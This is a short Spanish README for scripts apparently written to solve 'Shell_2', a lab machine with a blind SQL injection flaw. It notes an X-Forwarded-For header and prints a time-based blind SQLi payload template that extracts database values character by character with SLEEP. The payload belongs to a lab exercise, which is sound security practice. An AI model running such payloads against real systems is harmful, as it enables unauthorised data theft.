# Shell2SQLi
Este repositorio contiene scripts utilizados para `Shell_2`, una máquina con vulnerabilidad SQLi Blind.

## Consideraciones de la máquina

    El host `192.168.44.134` no está editado en los scripts, la VM se utilizó con configuración NAT
    Uso de encabezado `X-Forwarded-For`
    

## Impacto vulnerabilidad SQLi

### Procedimiento:

```SQL
  1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
```

    
## Disclaimer

El autor no se hace responsable de algún uso inadecuado que pueda causar impactos negativos. El propósito es y sólo es con fines educativos.
Las contribuciones son bienvenidas, también siéntete libre de mejorar y modificar según sea necesario.
